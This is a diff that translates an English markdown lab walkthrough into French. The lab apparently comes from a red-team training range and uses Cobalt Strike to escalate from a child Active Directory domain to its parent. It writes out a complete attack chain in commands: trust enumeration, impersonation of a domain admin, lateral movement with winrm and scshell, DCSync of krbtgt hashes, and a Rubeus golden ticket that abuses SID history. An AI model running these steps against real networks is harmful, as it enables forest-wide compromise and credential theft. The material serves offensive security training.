@@ -1,42 +1,42 @@
-# Parent Child Trusts Lab  
+# Lab — Parent-Child Trusts  
 
->The objective for this lab is to hop from a child domain to its parent.
+>L’objectif de ce lab est de passer d’un **domaine enfant** à son **domaine parent**.
 
-## Enumeration
+## Énumération
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Interact with the Beacon and enumerate the trust.
+1. Lancer **Cobalt Strike** et se connecter au **team server**.
+2. Interagir avec le **Beacon** et énumérer la **trust**.
 
 ```Beacon-nocolor
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 ```
 
-⚠️ results
+⚠️ Résultats
  
     > - trustDirection 3 is TRUST_DIRECTION_BIDIRECTIONAL
     > - trustAttributes 32 is TRUST_ATTRIBUTE_WITHIN_FOREST
 
-3. Obtain the domain SID for the child domain.
+3. Récupérer le **SID** du domaine enfant.
 
 ```Beacon-nocolor
 ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
 ```
 
-⚠️ This should return *S-1-5-21-690277740-3036021016-2883941857*.
+⚠️ La commande doit renvoyer *S-1-5-21-690277740-3036021016-2883941857*.
 
-4. Obtain the SID for parent domain's Enterprise Admins group.
+4. Récupérer le **SID** du groupe **Enterprise Admins** du domaine parent.
 
 ```Beacon-nocolor
 ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
 ```
 	
-⚠️ This should return *S-1-5-21-3926355307-1661546229-813047887-519*.
+⚠️ La commande doit renvoyer *S-1-5-21-3926355307-1661546229-813047887-519*.
 
 ===
 
 ## Credential Access
 
-1. Impersonate the *sguest* user.
+1. Effectuer une **impersonation** de l’utilisateur *sguest*.
 
 ```
 ps
@@ -47,25 +47,25 @@ krb_triage
 ls \\dub-dc-1\c$
 ```
 
-⚠️ This user is a domain admin in the child Dublin domain.
+⚠️ Cet utilisateur est **Domain Admin** dans le domaine enfant Dublin.
 
-## Lateral Movement to Dublin Ireland  
+## Lateral Movement vers le domaine Dublin  
 
 ```
 jump winrm64 dub-dc-1 smb
 ```
 
-## Privilege Escalation + Persistence
+## Privilege Escalation et Persistence
 
-1. Switch to the `dub-dc-1` beacon.
-2. Obtain the AES256 hash for the child domain's krbtgt account.
+1. Passer au **Beacon** `dub-dc-1`.
+2. Récupérer le **hash AES256** du compte `krbtgt` du domaine enfant.
 
 ```
 krb_triage
 dcsync dublin.contoso.com DUBLIN\krbtgt
 ```
 
->dcsync output
+> Sortie de `dcsync`
 
 ```
 <snip>
@@ -77,9 +77,9 @@ Credentials
 <snip>
 ```
 
-## Golden Exploitation
+## Golden Ticket
 
-1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file in powershell terminal.
+1. Depuis l’**Attacker Desktop**, générer un **Golden Ticket** dans un fichier `.kirbi` à l’aide du terminal PowerShell.
 
 ```Terminal-nocolor
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
@@ -87,42 +87,42 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain
 
 <img src="/images/powershell_Rubeus_golden_dublin_output.png">  
 
-2. Inject the Golden ticket into the Beacon session.
+2. Injecter le **Golden Ticket** dans la session Beacon.
 
 ```Beacon-nocolor
 kerberos_ticket_use C:\Users\Attacker\Desktop\golden_2026_04_29_06_43_02_Administrator_to_krbtgt@DUBLIN.CONTOSO.COM
 ```
 
-⚠️ This will replace the current TGT for `sguest`.
+⚠️ Cette opération remplace le **TGT** actuel de `sguest`.
 
-3. Verify the ticket is in the session.
+3. Vérifier la présence du ticket dans la session.
 ```
 getuid
 run klist
 krb_triage
 ```
 
-4. Access the parent domain's domain controller.
+4. Accéder au **Domain Controller** du domaine parent.
 ```
 ls \\lon-dc-1\c$
 ```
 
-## Lateral Movement to London from Ireland  
+## Lateral Movement de Dublin vers Londres  
 
->load 🔄 script manager CNA `C:\Tools\SCShell\CS-BOF\scshell.cna` for `scshell64`  
+> Charger le fichier CNA dans le **Script Manager** `C:\Tools\SCShell\CS-BOF\scshell.cna` for `scshell64`  
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
   
-## Forest and Domain Dominance  
+## Forest et Domain Dominance  
 
 ```
 getuid
 dcsync contoso.com CONTOSO\krbtgt
 ```
 
->DCsync output:  
+> Sortie de DCSync :  
 ```
 ** SAM ACCOUNT **
 
@@ -152,5 +152,5 @@ Supplemental Credentials:
 
 <img src="/images/Parent-Child-Trusts-dcsync-contoso-krbtgt.png">  
 
-⚠️ In this lab, you have forged a golden ticket using SID history to impersonate an enterprise admin, and hop a parent-child trust.
+⚠️ Dans ce lab, un **Golden Ticket** exploitant la **SID History** permet l’impersonation d’un Enterprise Admin et le passage d’une **Parent-Child Trust**.
 
